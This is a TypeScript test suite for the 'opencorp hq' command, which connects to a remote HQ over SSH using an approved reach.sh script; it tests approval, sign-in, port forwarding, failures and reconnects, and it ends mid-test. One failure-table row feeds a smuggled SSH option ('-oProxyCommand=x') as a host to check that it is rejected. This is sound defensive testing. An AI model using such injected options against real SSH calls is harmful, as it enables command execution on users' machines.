/** A visit from a machine where no office answers: approving the saved path, connecting, signing in or opening,
 *  another visit beside a running one, the failure table, and waiting with its reconnects; and the runs of learn_hq
 *  and reach_hq it starts. */
import { execFileSync } from "node:child_process"
import fs from "node:fs"
import http from "node:http"
import net from "node:net"
import os from "node:os"
import path from "node:path"
import { expect, onTestFinished, setDefaultTimeout, test } from "bun:test"
import { AuthStore } from "@ngocbh/yian/llm_clients"
import { ConnectionFile } from "../../src/chat/connections.ts"
import { Provider } from "../../src/chat/provider.ts"
import { Learning } from "../../src/reach/learning.ts"
import { makeDirs, ReachPaths } from "../../src/reach/paths.ts"
import type { Spec } from "../../src/reach/spec.ts"
import { type Access, DEFAULT_PORT, readAccess, sha256, takeLock, writeAccess } from "../../src/reach/state.ts"
import {
  AFTER_CAP,
  ANSWER_GOES_TO_MODEL,
  BUSY,
  ASKED_FOR,
  CAPPED,
  describe as describeFailure,
  lastPath,
  learnedMessage,
  MAX_OLD_CHARS,
  LOST,
  NO_OFFICE_HERE,
  NO_PATH,
  NOT_LEARNED,
  RELEARN_BUSY,
  NOT_YET,
  runLearn,
  runReach,
  runThis,
  RUNNING,
  type LearnScreen,
  SIGN_IN_HINT,
  STOP,
  useChanged,
  opener,
  realVisitDeps,
  type VisitOptions,
  visit,
} from "../../src/reach/run.ts"
import { learnProvider } from "../../src/reach/provider.ts"
import { SAVED, saveAccess } from "../../src/reach/tools/save_access.ts"
import { runShell } from "../../src/reach/tools/shell.ts"
import { KeyboardInterrupt, OnboardError, TtyPrompter } from "../../src/install/prompts.ts"
import { ReachFailure } from "../../src/reach/connect.ts"
import { PassThrough } from "node:stream"
import { defaultIncludes } from "../../src/reach/ssh.ts"
import { writePrivate } from "../../src/secrets.ts"
import { type FakeSsh, type FakeSshBehavior, fakeControlName } from "../../src/testing/fake_ssh.ts"
import { control, exitAll, isSocket, type ReachContext } from "../../src/reach/ssh.ts"
import { LLM_CONFIG, type ScriptedReply } from "../../src/testing/fake_llm.ts"
import {
  beforeLearning,
  HAND_OVER_COMMAND,
  HAND_OVER_TEST,
  LEARN,
  LEARN_QUESTION,
  RELEARN_QUESTION,
} from "../../src/reach/risks.ts"
import { providerSecrets, signInLine, withSignIn } from "../../src/install/onboard.ts"
import { workerEnv } from "../../src/worker/spawn.ts"
import { fakeLlm } from "../chat/helpers.ts"
import { DEVICE_CODE, DEVICE_URL, fakeSubscription, Script } from "../install/helpers.ts"
import { ps, waitFor } from "../helpers.ts"
import {
  approved,
  chain,
  fakeHome,
  fakeRemote,
  freePort,
  reachCtx,
  rejection,
  SPEC,
  subscribed,
  SUBSCRIBED_LLM,
  tokens,
  visitDeps,
} from "./helpers.ts"

setDefaultTimeout(30_000)

/** reach.sh as an owner would write it: log in to login1 (leaving its master), then print `spec`. */
const scriptFor = (spec: Spec) => `set -eu\nssh login1 true\nprintf '%s\\n' '${JSON.stringify(spec)}'\n`

/** Makes `<dir>/hq` and writes `body` as reach.sh, approved (with access.json) unless `approved` is false. */
async function saved(dir: string, body: string, over: Partial<Access> = {}): Promise<ReachPaths> {
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(paths.script, body)
  await writePrivate(paths.approved, body)
  await writeAccess(paths, {
    port: DEFAULT_PORT,
    sha256: sha256(body),
    learned_at: "2026-11-01T10:00:00.000Z",
    last_used_at: null,
    signed_in_at: null,
    ...over,
  })
  return paths
}

const NO_JOB = (marker: string) => `touch '${marker}'\necho "no job running" >&2\nexit 3\n`

test("without a terminal and no reach.sh it says to start the office here, learn in a terminal or write one; exits 3 and makes nothing", async () => {
  const { dir, fake } = fakeHome()
  const { deps, errors } = visitDeps(dir, fake, { interactive: false })
  expect(await visit({ signIn: false, open: false }, deps)).toBe(3)
  const paths = new ReachPaths(dir)
  expect(errors).toEqual([NO_PATH(paths)])
  expect(errors[0]).toStartWith(`${NO_OFFICE_HERE}\n`)
  expect(NO_OFFICE_HERE).toBe(
    "opencorp hq: no office answers here. If HQ runs on this machine, start it with `opencorp start` (`opencorp doctor` says why it's down).",
  )
  expect(errors[0]).toContain("run `opencorp hq` in a terminal to learn the way there with an agent")
  expect(errors[0]).toContain(`or write ${paths.script}`)
  expect(fs.existsSync(paths.dir)).toBe(false)
  expect(fake.calls()).toEqual([])
})

test("a home too long for SSH's sockets matters only once there's a reach.sh", async () => {
  const { dir, fake } = fakeHome()
  const home = path.join(dir, "a-folder-name-long-enough-to-pass-the-limit")
  let v = visitDeps(home, fake, { interactive: false })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(3)
  expect(v.errors).toEqual([NO_PATH(new ReachPaths(home))])
  fs.mkdirSync(path.join(home, "hq"), { recursive: true, mode: 0o700 })
  fs.writeFileSync(path.join(home, "hq", "reach.sh"), "exit 3\n")
  v = visitDeps(home, fake)
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors[0]).toContain("SSH's control sockets under it need at most 39")
})

test("an owner-written reach.sh is shown whole and runs only once approved", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  const marker = path.join(dir, "ran")
  const body = NO_JOB(marker)
  fs.writeFileSync(paths.script, body, { mode: 0o644 })
  const { deps, prompter, errors } = visitDeps(dir, fake, { answers: ["1"] })
  expect(await visit({ signIn: false, open: false }, deps)).toBe(3)
  expect(prompter.seen).toContain(`  1  touch '${marker}'`)
  expect(prompter.seen).toContain("  3  exit 3")
  expect(prompter.seen.filter((line) => line === runThis(3))).toHaveLength(1)
  expect(runThis(3)).toBe("Run this 3-line reach.sh on every visit?")
  expect(fs.readFileSync(paths.approved, "utf8")).toBe(body)
  const access = await readAccess(paths)
  expect(access).toMatchObject({ sha256: sha256(body), port: 49381, signed_in_at: null, last_used_at: null })
  expect(fs.existsSync(marker)).toBe(true)
  expect(errors).toEqual([
    "opencorp hq: no office answers there: no job running. Start the job or the office there, or run `opencorp hq --relearn` if HQ moved for good.",
  ])
})

test("after the approval's answer, stdin leaves raw mode and is paused before reach.sh runs", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(paths.script, 'echo "running" >&2\nexit 3\n')
  const modes: boolean[] = []
  const stdin = Object.assign(new PassThrough(), { isTTY: true, setRawMode: (on: boolean) => void modes.push(on) })
  const seen: { paused: boolean; modes: boolean[] }[] = []
  const v = visitDeps(dir, fake, { answers: ["1"] })
  const deps = { ...v.deps, stdin, echo: () => void seen.push({ paused: stdin.isPaused(), modes: [...modes] }) }
  expect(await visit({ signIn: false, open: false }, deps)).toBe(3)
  // So Bun holds no read on the terminal that would take the keys meant for ssh's prompt.
  expect(seen[0]).toEqual({ paused: true, modes: [false] })
})

test("an approval left unanswered stops the visit", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  const marker = path.join(dir, "ran")
  fs.writeFileSync(paths.script, NO_JOB(marker))
  const { deps } = visitDeps(dir, fake, { interactive: false })
  expect(await visit({ signIn: false, open: false }, deps)).toBe(1)
  expect(fs.existsSync(paths.access)).toBe(false)
  expect(fs.existsSync(paths.approved)).toBe(false)
  expect(fs.existsSync(marker)).toBe(false)
})

test("Ctrl-C at the approval question exits 130 and approves nothing", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(paths.script, NO_JOB(path.join(dir, "ran")))
  const v = visitDeps(dir, fake)
  v.prompter.choose = async () => {
    throw new KeyboardInterrupt()
  }
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(130)
  expect(v.errors).toEqual([])
  expect(fs.existsSync(paths.access)).toBe(false)
})

test("a changed reach.sh shows the diff and asks once; no stops the visit", async () => {
  const { dir, fake } = fakeHome()
  const remote = await fakeRemote(dir)
  const before = scriptFor({ host: "node1", jump: ["login1"], opencorp: remote.opencorp })
  const paths = await saved(dir, before)
  const access = fs.readFileSync(paths.access, "utf8")
  const marker = path.join(dir, "ran")
  fs.writeFileSync(paths.script, `touch '${marker}'\n${before}`)
  const { deps, prompter, errors } = visitDeps(dir, fake, { answers: ["2"] })
  expect(await visit({ signIn: false, open: false }, deps)).toBe(1)
  expect(prompter.seen).toContain(`+touch '${marker}'`)
  expect(prompter.seen.filter((line) => line === useChanged(4))).toHaveLength(1)
  expect(useChanged(4)).toBe("Use the changed 4-line reach.sh on every visit?")
  expect(fs.readFileSync(paths.access, "utf8")).toBe(access)
  expect(fs.readFileSync(paths.approved, "utf8")).toBe(before)
  expect(fs.existsSync(marker)).toBe(false)
  expect(errors).toEqual(["opencorp hq: stopped; reach.sh isn't approved."])
  expect(fake.calls()).toEqual([])
})

/** The command lines of this user's processes that mention `text`, but not the `ps` listing them. */
function processes(text: string): string[] {
  const out = execFileSync(ps(), ["-A", "-o", "pid=,args="], { env: { LC_ALL: "C" }, encoding: "utf8", timeout: 5000 })
  return out
    .split("\n")
    .filter((line) => line.includes(text) && !line.includes(" -o pid=,args="))
    .map((line) => line.trim())
}

/** A home with HQ's machine reached as node1 through login1: an approved reach.sh and a free port. */
async function approvedHome(behavior: FakeSshBehavior = {}, over: Partial<Access> = {}) {
  const { dir, fake } = fakeHome(behavior)
  const remote = await fakeRemote(dir)
  const spec: Spec = { host: "node1", jump: ["login1"], opencorp: remote.opencorp }
  const port = await freePort()
  const paths = await saved(dir, scriptFor(spec), { port, ...over })
  return { dir, fake, remote, spec, port, paths }
}

/** Starts a visit and waits for its "Connected." line. */
async function connected(dir: string, fake: FakeSsh, options: VisitOptions, more: Parameters<typeof visitDeps>[2] = {}) {
  const v = visitDeps(dir, fake, more)
  const done = visit(options, v.deps)
  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")) || v.errors.length > 0, { what: "the visit to connect" })
  expect(v.errors).toEqual([])
  return { ...v, done }
}

/** What's left of a visit once it returned: control sockets, fake masters, and processes naming the hq folder. */
function leftover(fake: FakeSsh, paths: ReachPaths) {
  return { cm: fs.readdirSync(paths.cm), masters: fake.masters(), processes: processes(paths.dir) }
}

test("a visit writes the ssh files with the given includes and starts one watcher", async () => {
  const { dir, fake, paths } = await approvedHome()
  const inc = path.join(dir, "inc")
  const v = await connected(dir, fake, { signIn: false, open: false }, { sshIncludes: [inc] })
  expect(fs.readFileSync(paths.config, "utf8")).toContain(`Include "${inc}"`)
  expect(fs.readFileSync(paths.batchConfig, "utf8")).toContain(`Include "${inc}"`)
  expect(fs.statSync(paths.wrapper).mode & 0o777).toBe(0o700)
  expect(processes(paths.cm).filter((line) => line.includes("opencorp-hq-watch"))).toHaveLength(1)
  v.sigint()
  expect(await v.done).toBe(0)
})

test("a visit's end runs exitAll, then releases the watcher, before the lock is free", async () => {
  const { dir, fake, paths } = await approvedHome()
  const v = await connected(dir, fake, { signIn: false, open: false })
  expect(takeLock(paths)).toBeNull()
  expect(fake.masters().length).toBe(2)
  v.sigint()
  expect(await v.done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
  const lock = takeLock(paths)
  expect(lock).not.toBeNull()
  lock!.release()
})

test("Ctrl-C before connecting returns 130 and leaves nothing", async () => {
  const { dir, fake, paths } = await approvedHome({ hosts: { node1: { login: "hang" } } })
  const v = visitDeps(dir, fake)
  const done = visit({ signIn: false, open: false }, v.deps)
  await waitFor(() => fake.calls().some((argv) => argv.includes("-M")), { what: "the node master" })
  v.sigint()
  expect(await done).toBe(130)
  expect(v.errors).toEqual([])
  await waitFor(() => processes(paths.dir).length === 0, { what: "the hung login to end", timeout: 10_000 })
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

/** The fake's mux calls that ran `opencorp hq --json` there: a code minted. */
const mints = (fake: FakeSsh) => fake.calls().filter((argv) => argv.at(-1)!.endsWith("'hq' '--json'"))
/** The redirect files in the hq folder. */
const redirects = (paths: ReachPaths) => fs.readdirSync(paths.dir).filter((name) => name.startsWith("pair-"))
const DAY = 24 * 60 * 60_000

test("the first visit signs in through a redirect file and records signed_in_at", async () => {
  const { dir, fake, remote, port, paths } = await approvedHome()
  const v = await connected(dir, fake, { signIn: false, open: true })
  expect(v.opened).toHaveLength(1)
  const file = v.opened[0]!
  expect(path.dirname(file)).toBe(paths.dir)
  expect(path.basename(file)).toMatch(/^pair-[0-9a-f]{16}\.html$/)
  expect(fs.statSync(file).mode & 0o777).toBe(0o600)
  expect(fs.readFileSync(file, "utf8")).toContain(`href="http://127.0.0.1:${port}/pair#${remote.code}"`)
  const access = await readAccess(paths)
  expect(access?.signed_in_at).not.toBeNull()
  expect(access?.last_used_at).not.toBeNull()
  // What a relearn compares to keep the browser's sign-in.
  expect(access).toMatchObject({ host: "node1", socket: remote.socket })
  v.sigint()
  expect(await v.done).toBe(0)
})

test("a replay reads neither hq/provider.json nor hq/auth.json", async () => {
  const { dir, fake, paths } = await approvedHome({}, { signed_in_at: new Date().toISOString() })
  // Unreadable, so any read would fail.
  fs.writeFileSync(paths.provider, '{"method": "subscription", "llm_config": {"provider": "openai"}}', { mode: 0o000 })
  fs.writeFileSync(paths.auth, "{nope", { mode: 0o000 })
  const v = await connected(dir, fake, { signIn: false, open: false })
  expect(v.prompter.seen).toEqual([])
  v.sigint()
  expect(await v.done).toBe(0)
})

test("a replay makes no model call even with a provider file next to it", async () => {
  const llm = await fakeLlm()
  const { dir, fake } = fakeHome()
  const ctx = await reachCtx(dir, fake)
  await writePrivate(ctx.paths.provider, JSON.stringify({ llm_config: LLM_CONFIG, env: llm.env() }))
  const spec = { ...SPEC, port: 2222, env: { OPENCORP_HOME: "/h/o" } }
  await approved(ctx.paths, `printf '%s\\n' '${JSON.stringify(spec)}'\n`)
  expect(await runReach(ctx)).toEqual({ outcome: "ok", spec, detail: "" })
  expect(llm.requests()).toEqual([])
})

test("a later visit opens HQ's URL and mints nothing", async () => {
  const { dir, fake, port, paths } = await approvedHome({}, { signed_in_at: new Date().toISOString() })
  const v = await connected(dir, fake, { signIn: false, open: true })
  expect(v.opened).toEqual([`http://127.0.0.1:${port}/`])
  expect(mints(fake)).toEqual([])
  expect(redirects(paths)).toEqual([])
  expect(v.printed).not.toContain(SIGN_IN_HINT)
  v.sigint()
  expect(await v.done).toBe(0)
})

test("--sign-in mints again, and --port moves the port and signs in again", async () => {
  const signedIn = new Date(Date.now() - DAY).toISOString()
  const { dir, fake, remote, port, paths } = await approvedHome({}, { signed_in_at: signedIn })
  let v = await connected(dir, fake, { signIn: true, open: false })
  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
  expect(mints(fake)).toHaveLength(1)
  v.sigint()
  expect(await v.done).toBe(0)
  expect((await readAccess(paths))?.signed_in_at).not.toBe(signedIn)
  const moved = await freePort()
  v = await connected(dir, fake, { signIn: false, port: moved, open: false })
  expect(v.printed).toContain(`http://127.0.0.1:${moved}/pair#${remote.code}`)
  expect(mints(fake)).toHaveLength(2)
  const res = await fetch(`http://127.0.0.1:${moved}/api/health`, { headers: { connection: "close" } })
  expect(res.status).toBe(200)
  v.sigint()
  expect(await v.done).toBe(0)
  expect((await readAccess(paths))?.port).toBe(moved)
})

test("after 30 days signed in it hints at --sign-in", async () => {
  const old = new Date(Date.now() - 31 * DAY).toISOString()
  const { dir, fake } = await approvedHome({}, { signed_in_at: old })
  const v = await connected(dir, fake, { signIn: false, open: false })
  expect(v.printed).toContain(SIGN_IN_HINT)
  expect(mints(fake)).toEqual([])
  v.sigint()
  expect(await v.done).toBe(0)
})

test("without opening it prints the URL or the sign-in link", async () => {
  const { dir, fake, remote, port, paths } = await approvedHome()
  let v = await connected(dir, fake, { signIn: false, open: false })
  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
  expect([v.opened, redirects(paths)]).toEqual([[], []])
  v.sigint()
  expect(await v.done).toBe(0)
  v = await connected(dir, fake, { signIn: false, open: false })
  expect(v.printed).toContain(`http://127.0.0.1:${port}/`)
  v.sigint()
  expect(await v.done).toBe(0)
})

test("when the opener can't start it says why and prints the link", async () => {
  const { dir, fake, remote, port } = await approvedHome()
  const v = visitDeps(dir, fake, {
    open: () => {
      throw new Error("no xdg-open")
    },
  })
  const done = visit({ signIn: false, open: true }, v.deps)
  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")), { what: "the visit to connect" })
  expect(v.errors).toEqual(["opencorp hq: couldn't open a browser (no xdg-open); open this link:"])
  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
  v.sigint()
  expect(await done).toBe(0)
})

test("the visit line names what stays open until Ctrl-C", async () => {
  const { dir, fake, port } = await approvedHome()
  const v = await connected(dir, fake, { signIn: false, open: false })
  expect(v.printed.at(-1)).toBe(
    `Connected. Until Ctrl-C these stay open: SSH to node1 through login1, and HQ at http://127.0.0.1:${port}/.`,
  )
  v.sigint()
  expect(await v.done).toBe(0)
})

/** Whether the master at `cm/node` answers `-O check`. */
async function nodeUp(dir: string, fake: FakeSsh): Promise<boolean> {
  const ctx: ReachContext = await reachCtx(dir, fake)
  return (await control(ctx, ctx.paths.node, "check")).code === 0
}

test("while another opencorp hq holds the lock it only opens HQ's URL, and the running visit's master survives", async () => {
  const { dir, fake, port } = await approvedHome({}, { signed_in_at: new Date().toISOString() })
  const first = await connected(dir, fake, { signIn: false, open: false })
  const second = visitDeps(dir, fake)
  expect(await visit({ signIn: false, open: true }, second.deps)).toBe(0)
  expect(second.opened).toEqual([`http://127.0.0.1:${port}/`])
  expect(second.errors).toEqual([RUNNING])
  expect(second.prompter.seen).toEqual([])
  expect(await nodeUp(dir, fake)).toBe(true)
  first.sigint()
  expect(await first.done).toBe(0)
})

test("--sign-in beside a running visit mints over its master and leaves the file for the sweep", async () => {
  const signedIn = new Date(Date.now() - DAY).toISOString()
  const { dir, fake, remote, port, paths } = await approvedHome({}, { signed_in_at: signedIn })
  const first = await connected(dir, fake, { signIn: false, open: false })
  const masters = fake.masters()
  const second = visitDeps(dir, fake)
  expect(await visit({ signIn: true, open: true }, second.deps)).toBe(0)
  expect(second.errors).toEqual([])
  expect(second.opened).toHaveLength(1)
  expect(fs.readFileSync(second.opened[0]!, "utf8")).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
  expect(redirects(paths)).toEqual([path.basename(second.opened[0]!)])
  expect((await readAccess(paths))?.signed_in_at).not.toBe(signedIn)
  // It rode the running visit's masters: no new login, and they're still up.
  expect(fake.masters().sort()).toEqual(masters.sort())
  expect(fake.calls().filter((argv) => argv.includes("-M"))).toHaveLength(1)
  expect(await nodeUp(dir, fake)).toBe(true)
  first.sigint()
  expect(await first.done).toBe(0)
})

test("--sign-in beside a visit that hasn't forwarded its port yet refuses and opens nothing", async () => {
  const signedIn = new Date(Date.now() - DAY).toISOString()
  const { dir, fake, remote, port, paths } = await approvedHome({}, { signed_in_at: signedIn })
  remote.setCheck({ stdout: JSON.stringify(remote.status), delay: 3 })
  const first = visitDeps(dir, fake)
  const done = visit({ signIn: false, open: false }, first.deps)
  const checks = () => fake.calls().filter((argv) => argv.at(-1)!.endsWith("'hq' '--check' '--json'"))
  await waitFor(() => checks().length === 1, { what: "the running visit's check" })
  // Another program takes the port while the running visit is still checking.
  const other = http.createServer((_req, res) => res.end(JSON.stringify({ ok: true, other: 1 })))
  await new Promise<void>((resolve) => other.listen({ port, host: "127.0.0.1" }, resolve))
  onTestFinished(() => void other.close())
  // Its check has read its 3 s; the second's answers at once, so the master is still up while it checks.
  await Bun.sleep(500)
  remote.setCheck({ stdout: JSON.stringify(remote.status) })
  expect(isSocket(paths.node)).toBe(true)
  const second = visitDeps(dir, fake)
  expect(await visit({ signIn: true, open: true }, second.deps)).toBe(1)
  expect(checks()).toHaveLength(2)
  expect(second.errors).toEqual([NOT_YET])
  expect([second.opened, second.printed]).toEqual([[], []])
  expect(mints(fake)).toEqual([])
  expect(redirects(paths)).toEqual([])
  expect((await readAccess(paths))?.signed_in_at).toBe(signedIn)
  expect(await done).toBe(1)
})

test("--sign-in before the running visit has connected says to try again", async () => {
  const { dir, fake } = await approvedHome({ hosts: { node1: { login: "hang" } } })
  const first = visitDeps(dir, fake)
  const done = visit({ signIn: false, open: false }, first.deps)
  await waitFor(() => fake.calls().some((argv) => argv.includes("-M")), { what: "the node master" })
  const second = visitDeps(dir, fake)
  expect(await visit({ signIn: true, open: false }, second.deps)).toBe(1)
  expect(second.errors).toEqual([NOT_YET])
  first.sigint()
  expect(await done).toBe(130)
})

test("with the lock held and no access.json yet, it says another run is approving or learning", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(paths.script, "exit 3\n")
  const lock = takeLock(paths)!
  try {
    const v = visitDeps(dir, fake)
    expect(await visit({ signIn: false, open: true }, v.deps)).toBe(1)
    expect(v.errors).toEqual([BUSY])
    expect(v.opened).toEqual([])
  } finally {
    lock.release()
  }
})

/** Each row: its setup on an approved home, then the line and the code it must end with. */
const FAILURES: [string, (h: Awaited<ReturnType<typeof approvedHome>>) => Promise<void> | void, (port: number) => string, number][] = [
  [
    "login refused",
    ({ fake }) => fake.set({ login: "refuse" }),
    () => "opencorp hq: couldn't connect: login1: Permission denied (publickey,password).",
    1,
  ],
  [
    "reach.sh exit 3",
    async ({ dir }) => void (await saved(dir, `echo "no job running" >&2\nexit 3\n`)),
    () => "opencorp hq: no office answers there: no job running. Start the job or the office there, or run `opencorp hq --relearn` if HQ moved for good.",
    3,
  ],
  [
    "check exit 1",
    ({ remote }) => remote.setCheck({ code: 1, stderr: "opencorp hq: this office has no HQ yet\n" }),
    () =>
      "opencorp hq: HQ isn't ready there: opencorp hq: this office has no HQ yet. Run `opencorp doctor` there, or update that checkout.",
    1,
  ],
  [
    "bad spec",
    async ({ dir, spec }) => void (await saved(dir, scriptFor({ ...spec, host: "-oProxyCommand=x" }))),
    () => "opencorp hq: the saved way to reach HQ is broken: reach.sh printed a spec that isn't valid: host: must be [user@]host",
    1,
  ],
  [
    "port held",
    async ({ port }) => {
      const holder = net.createServer()
      await new Promise<void>((resolve) => holder.listen({ port, host: "127.0.0.1" }, resolve))
      onTestFinished(() => void holder.close())
    },
    (port) =>
      `opencorp hq: port ${port} on 127.0.0.1 is taken by another program; pick a free one with \`opencorp hq --port N\` (you'll sign in again).`,
    1,
  ],
  [
    "blackhole forward",
    ({ fake }) => fake.set({ forward: "blackhole" }),
    (port) =>
      `opencorp hq: HQ didn't answer through the forward (the connection through port ${port} closed before HQ answered); the node's sshd may refuse socket forwarding (AllowStreamLocalForwarding).`,
    1,
  ],
]

test.each(FAILURES)("a failed visit says what to do and exits as the table says [%s]", async (_label, arrange, line, code) => {
  const home = await approvedHome()
  await arrange(home)
  // A broken path asks to relearn; the default, Stop, leaves the table's line and code.
  const v = visitDeps(home.dir, home.fake, { answers: [""] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(code)
  expect(v.errors).toEqual([line(home.port)])
  expect(mints(home.fake)).toEqual([])
  expect(fs.readdirSync(home.paths.cm)).toEqual([])
  expect(home.fake.masters()).toEqual([])
})

/** The control sockets the fake's `-O exit` calls named, in order. */
const exits = (fake: FakeSsh) =>
  fake.calls().filter((argv) => argv.includes("-O") && argv.includes("exit")).map((argv) => argv[argv.indexOf("-S") + 1])

/** Drops the connection: SIGTERM to the node master, found by its control socket in its arguments. */
function dropNode(paths: ReachPaths): void {
  const line = processes(`-S ${paths.node}`).find((l) => l.includes(" -M "))
  if (line === undefined) throw new Error("no node master")
  process.kill(Number(line.split(/\s+/)[0]), "SIGTERM")
}

/** The visit lines printed so far. */
const visitLines = (printed: string[]) => printed.filter((line) => line.startsWith("Connected."))

test("Ctrl-C while connected ends every master and exits 0", async () => {
  const { dir, fake, paths } = await approvedHome({}, { signed_in_at: new Date().toISOString() })
  const v = await connected(dir, fake, { signIn: false, open: false })
  expect(exits(fake)).toEqual([])
  v.sigint()
  expect(await v.done).toBe(0)
  expect(exits(fake)).toEqual([paths.node, path.join(paths.cm, fakeControlName("login1"))])
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("a drop is retried once quietly in BatchMode before asking for Enter", async () => {
  const { dir, fake, paths } = await approvedHome({ batch: "ok", banner: "Welcome to the cluster\n" }, {
    signed_in_at: new Date().toISOString(),
  })
  const v = await connected(dir, fake, { signIn: false, open: false })
  expect(v.echoed.join("")).toContain("Welcome to the cluster")
  const echoed = v.echoed.length
  const batched = () => fake.calls().filter((argv) => argv.includes(paths.batchConfig))
  expect(batched()).toEqual([])
  dropNode(paths)
  await waitFor(() => visitLines(v.printed).length === 2, { what: "the visit to reconnect" })
  expect(v.errors).toEqual([])
  expect(batched().some((argv) => argv.includes("-M"))).toBe(true)
  expect(batched().some((argv) => argv.includes("login1"))).toBe(true)
  expect(v.echoed.length).toBe(echoed)
  v.sigint()
  expect(await v.done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("when the quiet try fails it waits for Enter, and again after each failure", async () => {
  const { dir, fake } = fakeHome({ batch: "refuse" })
  const remote = await fakeRemote(dir)
  const fail = path.join(dir, "fail")
  const spec: Spec = { host: "node1", jump: ["login1"], opencorp: remote.opencorp }
  const paths = await saved(dir, `[ ! -e '${fail}' ] || exit 1\n${scriptFor(spec)}`, {
    port: await freePort(),
    signed_in_at: new Date().toISOString(),
  })
  // No answers: a relearning question would fail the visit.
  const v = await connected(dir, fake, { signIn: false, open: false })
  const lost = () => v.errors.filter((line) => line === LOST).length
  dropNode(paths)
  await waitFor(() => lost() === 1, { what: "the first press Enter" })
  fs.writeFileSync(fail, "")
  v.stdin.write("\n")
  await waitFor(() => lost() === 2, { what: "the second press Enter" })
  expect(v.errors).toEqual([LOST, "opencorp hq: the saved way to reach HQ is broken: reach.sh exited 1", LOST])
  fs.rmSync(fail)
  v.stdin.write("\n")
  await waitFor(() => visitLines(v.printed).length === 2, { what: "the visit to reconnect" })
  expect(v.prompter.seen).toEqual([])
  v.sigint()
  expect(await v.done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("stdin closing while it waits for Enter ends the visit with 1", async () => {
  const { dir, fake, paths } = await approvedHome({ batch: "refuse" }, { signed_in_at: new Date().toISOString() })
  const v = await connected(dir, fake, { signIn: false, open: false })
  dropNode(paths)
  await waitFor(() => v.errors.includes(LOST), { what: "press Enter" })
  v.stdin.end()
  expect(await v.done).toBe(1)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("realVisitDeps asks on stderr, opens with open or xdg-open, and includes the passwd home's ssh config", () => {
  const deps = realVisitDeps("/h/o")
  expect(deps.home).toBe("/h/o")
  expect(deps.env).toBe(process.env)
  expect(deps.stdin).toBe(process.stdin)
  expect(deps.prompter).toBeInstanceOf(TtyPrompter)
  expect((deps.prompter as unknown as { output: unknown }).output).toBe(process.stderr)
  expect([opener("darwin"), opener("linux")]).toEqual(["open", "xdg-open"])
  // The passwd entry's home, which ssh's `~` means, whatever $HOME says; only the path, never read here.
  expect(deps.sshIncludes).toEqual(defaultIncludes(os.userInfo().homedir))
  expect(deps.limits).toBeUndefined()
})

test("Enters typed while connected don't count: one prompt, and no attempt until a fresh Enter", async () => {
  const { dir, fake, paths } = await approvedHome({ batch: "refuse" }, { signed_in_at: new Date().toISOString() })
  const v = await connected(dir, fake, { signIn: false, open: false })
  const masters = () => fake.calls().filter((argv) => argv.includes("-M")).length
  v.stdin.write("\n\n\n")
  await Bun.sleep(100)
  dropNode(paths)
  await waitFor(() => v.errors.includes(LOST), { what: "press Enter" })
  await Bun.sleep(1000)
  expect(v.errors).toEqual([LOST])
  expect(masters()).toBe(1)
  v.stdin.write("\n")
  await waitFor(() => visitLines(v.printed).length === 2, { what: "the visit to reconnect" })
  expect(v.errors).toEqual([LOST])
  expect(masters()).toBe(2)
  v.sigint()
  expect(await v.done).toBe(0)
})

test("a failed retry ends only the node master, so the next Enter rides the login master", async () => {
  const { dir, fake, paths } = await approvedHome({ batch: "refuse" }, { signed_in_at: new Date().toISOString() })
  const v = await connected(dir, fake, { signIn: false, open: false })
  const before = fake.logins().length
  const lost = () => v.errors.filter((line) => line === LOST).length
  fake.set({ batch: "refuse", hosts: { node1: { login: "refuse" } } })
  dropNode(paths)
  await waitFor(() => lost() === 1, { what: "the first press Enter" })
  v.stdin.write("\n")
  await waitFor(() => lost() === 2, { what: "the second press Enter" })
  v.stdin.write("\n")
  await waitFor(() => lost() === 3, { what: "the third press Enter" })
  expect(fake.logins().slice(before)).toEqual(["login1"])
  fake.set({ batch: "refuse" })
  v.stdin.write("\n")
  await waitFor(() => visitLines(v.printed).length === 2, { what: "the visit to reconnect" })
  expect(fake.logins().slice(before)).toEqual(["login1", "node1"])
  v.sigint()
  expect(await v.done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("a reach.sh that is a symlink says it must be a regular file", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(path.join(dir, "real.sh"), "exit 3\n")
  fs.symlinkSync(path.join(dir, "real.sh"), paths.script)
  const v = visitDeps(dir, fake, { answers: ["1"] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors).toEqual([`opencorp hq: ${paths.script} is a symbolic link; it must be a regular file`])
  expect(v.prompter.seen).toEqual([])
})

test("a changed reach.sh whose approved copy isn't the approved one is shown whole, as new", async () => {
  const { dir, fake } = fakeHome()
  const paths = await saved(dir, "echo one\nexit 3\n")
  // Someone edited the copy to diff against, to hide a line in the diff.
